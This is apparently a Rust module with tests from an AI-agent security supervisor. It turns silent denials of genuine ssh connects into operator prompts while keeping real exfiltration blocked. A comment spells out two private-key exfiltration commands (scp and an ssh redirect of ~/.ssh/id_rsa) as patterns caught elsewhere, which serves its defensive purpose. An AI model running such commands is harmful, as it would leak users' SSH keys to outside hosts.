// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Review-band clamp for a genuine `ssh` remote-shell connect.
//!
//! ## The false positive
//!
//! `ssh user@host` reads the user's private key (`~/.ssh/id_*`) to authenticate,
//! then opens an outbound connection. Reading the key registers session-wide
//! **high taint** and arms **session containment**; the connect that follows is
//! then scored by the taint filter as `high-taint-network-sink` (5.0) *and* by
//! session-containment as `contained-network-egress` (3.5) — the same
//! `FileRead(~/.ssh)` charged twice — plus egress-policy `unknown-destination`
//! (3.5) for a host that isn't on a routine list. The composite crosses the
//! auto-deny threshold, so the syscall returns `EPERM` with **no prompt**: to
//! the user, ssh is simply broken. Retrying makes it worse (the egress-rate
//! blocked-destination-spread counter climbs), and a bare-IP host adds
//! reputation `raw-ip-destination` (3.0) on top.
//!
//! ## Why this is safe to treat as review, not deny
//!
//! SSH public-key authentication **signs a challenge**; it never transmits the
//! private key. "Highly tainted data flowing to network sink" is therefore
//! factually wrong for `ssh` reaching an sshd. The genuine exfiltration shapes
//! that *do* move a key over ssh — `scp ~/.ssh/id_rsa host:`, or
//! `ssh host 'cat >k' < ~/.ssh/id_rsa` — are a different binary (`scp`) or a
//! shell redirect, both caught at **ProcessSpawn** time by the taint data-flow
//! rule (`argv_arg_matches_tainted_path` / fd-lineage), not here. This clamp is
//! scoped to the `ssh` remote-shell binary only, whose argv positional is
//! `[user@]host [command]` and cannot carry a file-to-exfil as a plain operand.
//!
//! ## Clamp, never allow
//!
//! The clamp lands the call in the **review band** (a prompt), never at allow.
//! That is what makes the binary-identity check here deliberately lightweight:
//! the worst outcome of a mis-identified binary is "the operator is asked"
//! rather than "the syscall is silently denied" — a prompt-fatigue cost, never a
//! silent-exfiltration one. Every uncertainty fails closed (returns `None`,
//! leaving today's deny in place).
//!
//! Interaction with the sticky session-containment flag (which makes a session
//! allowlist grant inert, so `[a]llow` / `[s]ession` do not stick under
//! containment) is a separate concern tracked as follow-up work — this module
//! only converts the silent deny into a prompt.

use std::path::Path;

use crate::session_state::SessionStateRegistry;
use crate::types::{FilterResult, ToolCallContext, ToolCallType};

/// Canonical `ssh` client paths. Mirrors the `ssh` entry in
/// `filters::outbound_binaries` (kept local to avoid editing that
/// security-team-gated file for a read); if that list moves, update both.
const SSH_CANONICAL_PATHS: &[&str] = &["/usr/bin/ssh", "/usr/local/bin/ssh", "/bin/ssh"];

/// Filter names whose contribution is *expected* for a routine key-read →
/// connect sequence. If any filter OUTSIDE this set scored on the call, the
/// clamp declines: a real exfiltration that also trips secret-scan, dlp-gate,
/// destructive-action, canary, or a behavioural anomaly must still deny.
const BENIGN_CONTRIBUTORS: &[&str] = &[
    "operation-risk",
    "taint",
    "session-containment",
    "egress-policy",
    "reputation",
    "egress-rate",
];

/// If this call is a genuine `ssh` remote-shell connect that would otherwise be
/// auto-denied solely by the routine key-read → connect filter stack, return the
/// clamped score that lands it in the review band. Otherwise return `None` and
/// leave the score untouched.
///
/// `score` is the post-meta-rule composite. `allow_threshold` / `deny_threshold`
/// are the live cutoffs so the clamp target tracks operator-tuned thresholds.
pub fn maybe_clamp_ssh_connect(
    score: f64,
    allow_threshold: f64,
    deny_threshold: f64,
    results: &[FilterResult],
    ctx: &ToolCallContext,
) -> Option<f64> {
    // Only act when the call would otherwise deny; a queue/allow needs nothing.
    if score <= deny_threshold {
        return None;
    }

    // NetConnect only.
    if !matches!(ctx.call_type, ToolCallType::NetConnect { .. }) {
        return None;
    }

    // Supervisor path only. On the built-in-agent path `arguments` is verbatim
    // model JSON, so `pid`/`process` there are attacker-plantable; the whole
    // identification below would be forgeable. `plugin_id` cannot be set by the
    // model. (Same discipline as taint::is_supervisor_event.)
    if !ctx.plugin_id.starts_with("supervisor:") {
        return None;
    }

    // The connecting binary must resolve, canonically, to the ssh remote shell.
    let pid = ctx.arguments.get("pid").and_then(|v| v.as_u64())?;
    let canonical = canonical_exe_for_pid(pid)?;
    if canonical.file_name().and_then(|n| n.to_str()) != Some("ssh") {
        return None;
    }
    if !is_trusted_ssh(&canonical, ctx) {
        return None;
    }

    // Everything process-specific has passed; the rest is pure scoring policy.
    clamp_for_trusted_ssh(score, allow_threshold, deny_threshold, results)
}

/// The score-policy half of the clamp, split out from the `/proc`-dependent
/// identification so it is unit-testable without a live ssh process. Assumes the
/// caller has already established this is a trusted `ssh` remote-shell connect
/// that would otherwise deny.
fn clamp_for_trusted_ssh(
    score: f64,
    allow_threshold: f64,
    deny_threshold: f64,
    results: &[FilterResult],
) -> Option<f64> {
    // Nothing outside the routine key-read → connect stack may have contributed.
    if !only_benign_contributors(results) {
        return None;
    }

    // Land in the review band: below deny, comfortably above allow, so the
    // operator is prompted at a visible priority. Guard against an operator who
    // set an unusually narrow band.
    let target = (deny_threshold - 1.5).max(allow_threshold + 0.5);
    if target >= score {
        // Never *raise* a score; if the band is degenerate, leave the deny.
        return None;
    }
    Some(target)
}

/// Canonicalised `/proc/<pid>/exe`. `None` on any failure (process gone, race,
/// unreadable) — fail closed, the deny stands.
pub fn canonical_exe_for_pid(pid: u64) -> Option<std::path::PathBuf> {
    std::fs::canonicalize(format!("/proc/{pid}/exe")).ok()
}

/// `true` iff `canonical` is a standard system `ssh` remote-shell binary
/// (basename `ssh` at one of the known system paths). Path-anchored, never
/// basename-only, so a renamed copy elsewhere does not qualify.
pub fn is_system_ssh_path(canonical: &Path) -> bool {
    canonical.file_name().and_then(|n| n.to_str()) == Some("ssh")
        && SSH_CANONICAL_PATHS.contains(&canonical.to_string_lossy().as_ref())
}

/// `true` iff the process `pid` is currently executing a trusted system `ssh`.
/// Resolves `/proc/<pid>/exe`; any failure yields `false` (fail closed). Used
/// supervisor-side to decide whether an operator's connect approval earns a
/// containment-surviving `ssh-egress:` grant.
pub fn is_trusted_ssh_exe(pid: u64) -> bool {
    canonical_exe_for_pid(pid)
        .map(|c| is_system_ssh_path(&c))
        .unwrap_or(false)
}

/// Trust anchor for the resolved ssh binary. Because the clamp target is a
/// prompt (never an allow), this is intentionally lightweight: the binary is
/// trusted if its canonical path is a standard system ssh path, OR it was
/// pinned in the session inventory at session start. A binary that is neither
/// still denies exactly as today.
fn is_trusted_ssh(canonical: &Path, ctx: &ToolCallContext) -> bool {
    // Standard system location — the overwhelmingly common case.
    if is_system_ssh_path(canonical) {
        return true;
    }

    // Otherwise require it to have been pinned under a routine exec root at
    // session start (session inventory is pushed to this process over IPC).
    let canonical_str = canonical.to_string_lossy();
    if let Some(scope) = ctx.session_scope {
        if let Some(state) = SessionStateRegistry::global().get(scope) {
            if let Some(inv) = state.pinned_inventory() {
                return inv.expected_hash(&canonical_str).is_some();
            }
        }
    }
    false
}

/// True iff every filter that scored on this call is in [`BENIGN_CONTRIBUTORS`].
fn only_benign_contributors(results: &[FilterResult]) -> bool {
    results
        .iter()
        .filter(|r| r.matched && r.score > 0.0)
        .all(|r| BENIGN_CONTRIBUTORS.contains(&r.filter_name.as_str()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{Severity, ToolCallContext};
    use serde_json::json;
    use uuid::Uuid;

    /// A NetConnect context on the supervisor path, with `pid` pointing at this
    /// test process's own `/proc/self/exe` symlink target via an override.
    fn ssh_connect_ctx(pid: u64, address: &str, port: u16) -> ToolCallContext {
        let mut ctx = ToolCallContext::new(
            "supervisor:claude",
            ToolCallType::NetConnect {
                address: address.into(),
                port,
            },
            Uuid::new_v4(),
        );
        ctx.arguments = json!({ "pid": pid, "address": address, "port": port });
        ctx
    }

    fn taint_sink() -> FilterResult {
        FilterResult::matched(
            "taint",
            "high-taint-network-sink",
            5.0,
            Severity::Critical,
            "Highly tainted data flowing to network sink",
        )
    }
    fn containment() -> FilterResult {
        FilterResult::matched(
            "session-containment",
            "contained-network-egress",
            3.5,
            Severity::Warning,
            "Session containment active",
        )
    }
    fn unknown_dest() -> FilterResult {
        FilterResult::matched(
            "egress-policy",
            "unknown-destination",
            3.5,
            Severity::Warning,
            "Unknown outbound destination",
        )
    }
    fn op_risk() -> FilterResult {
        FilterResult::matched(
            "operation-risk",
            "network-egress",
            0.5,
            Severity::Notice,
            "Network egress",
        )
    }
    fn raw_ip() -> FilterResult {
        FilterResult::matched(
            "reputation",
            "raw-ip-destination",
            3.0,
            Severity::Warning,
            "Raw IP address destination",
        )
    }

    /// `/proc/self/exe` canonicalises to the running test binary, whose basename
    /// is not `ssh`, so identity resolution declines regardless of the filters.
    #[test]
    fn declines_when_binary_is_not_ssh() {
        let pid = std::process::id() as u64;
        let ctx = ssh_connect_ctx(pid, "vdepot.example:22", 22);
        let results = vec![op_risk(), taint_sink(), containment(), unknown_dest()];
        let score = 12.5;
        assert_eq!(
            maybe_clamp_ssh_connect(score, 3.0, 8.0, &results, &ctx),
            None
        );
    }

    #[test]
    fn declines_on_agent_path() {
        // plugin_id = "agent": arguments are model-controlled, so identity is
        // never trusted here even if pid/process were present.
        let mut ctx = ssh_connect_ctx(std::process::id() as u64, "h:22", 22);
        ctx.plugin_id = "agent".into();
        let results = vec![op_risk(), taint_sink(), containment(), unknown_dest()];
        assert_eq!(
            maybe_clamp_ssh_connect(12.5, 3.0, 8.0, &results, &ctx),
            None
        );
    }

    #[test]
    fn declines_when_already_below_deny() {
        let ctx = ssh_connect_ctx(std::process::id() as u64, "h:22", 22);
        let results = vec![op_risk(), taint_sink()];
        // 5.5 is already a queue — nothing to clamp.
        assert_eq!(maybe_clamp_ssh_connect(5.5, 3.0, 8.0, &results, &ctx), None);
    }

    #[test]
    fn declines_when_non_benign_filter_contributed() {
        // A canary or secret-scan hit means this is not a routine key-read.
        let ctx = ssh_connect_ctx(std::process::id() as u64, "h:22", 22);
        let mut results = vec![op_risk(), taint_sink(), containment(), unknown_dest()];
        results.push(FilterResult::matched(
            "secret-scan",
            "aws-secret-key",
            5.0,
            Severity::Critical,
            "AWS secret in argv",
        ));
        assert_eq!(
            maybe_clamp_ssh_connect(17.5, 3.0, 8.0, &results, &ctx),
            None
        );
    }

    #[test]
    fn declines_on_non_netconnect() {
        let mut ctx = ssh_connect_ctx(std::process::id() as u64, "h:22", 22);
        ctx.call_type = ToolCallType::ProcessSpawn {
            command: "/usr/bin/ssh".into(),
            args: vec!["ssh".into(), "host".into()],
        };
        let results = vec![op_risk(), taint_sink(), containment(), unknown_dest()];
        assert_eq!(
            maybe_clamp_ssh_connect(12.5, 3.0, 8.0, &results, &ctx),
            None
        );
    }

    #[test]
    fn only_benign_contributors_detects_outsider() {
        assert!(only_benign_contributors(&[
            op_risk(),
            taint_sink(),
            containment(),
            unknown_dest(),
            raw_ip()
        ]));
        let mut with_outsider = vec![taint_sink()];
        with_outsider.push(FilterResult::matched(
            "dlp-gate",
            "pii",
            4.0,
            Severity::Error,
            "PII",
        ));
        assert!(!only_benign_contributors(&with_outsider));
    }

    /// The score-policy half, exercised positively across the real observed
    /// range. A hostname connect (12.5) and a bare-IP connect (16.5) both clamp
    /// to the same review-band target; a call with a non-benign contributor
    /// does not clamp even at the policy layer.
    #[test]
    fn clamp_policy_lands_in_review_band() {
        let benign = vec![op_risk(), taint_sink(), containment(), unknown_dest()];
        // hostname case: 12.5 -> 6.5
        assert_eq!(
            clamp_for_trusted_ssh(12.5, 3.0, 8.0, &benign),
            Some(6.5),
            "hostname connect clamps into the review band"
        );
        // bare-IP case: 16.5 (adds raw-ip + spread) -> still 6.5
        let mut with_ip = benign.clone();
        with_ip.push(raw_ip());
        with_ip.push(FilterResult::matched(
            "egress-rate",
            "egress-blocked-spread",
            1.0,
            Severity::Notice,
            "spread",
        ));
        assert_eq!(clamp_for_trusted_ssh(16.5, 3.0, 8.0, &with_ip), Some(6.5));
        // The target is strictly a queue: above allow, at-or-below deny.
        let t = clamp_for_trusted_ssh(12.5, 3.0, 8.0, &benign).unwrap();
        assert!(t > 3.0 && t <= 8.0);
    }

    /// The clamp target tracks operator-tuned thresholds rather than a hardcoded
    /// 6.5, and never raises a score into a degenerate narrow band.
    #[test]
    fn clamp_policy_tracks_thresholds() {
        let benign = vec![op_risk(), taint_sink(), containment(), unknown_dest()];
        // Wider band (deny=18): target = 18-1.5 = 16.5, still below a 20.0 score.
        assert_eq!(clamp_for_trusted_ssh(20.0, 3.0, 18.0, &benign), Some(16.5));
        // Degenerate: score 6.0 with deny=8 would clamp to 6.5 which is > score;
        // never raise — decline.
        assert_eq!(clamp_for_trusted_ssh(6.0, 3.0, 8.0, &benign), None);
    }

    #[test]
    fn benign_set_ignores_zero_score_and_unmatched() {
        // A filter that ran but didn't match (no_match) or scored 0 must not
        // count as an "outsider".
        let results = vec![
            taint_sink(),
            FilterResult::no_match("behavioural"),
            FilterResult::matched("path-match", "noise", 0.0, Severity::Notice, "zero"),
        ];
        assert!(only_benign_contributors(&results));
    }
}
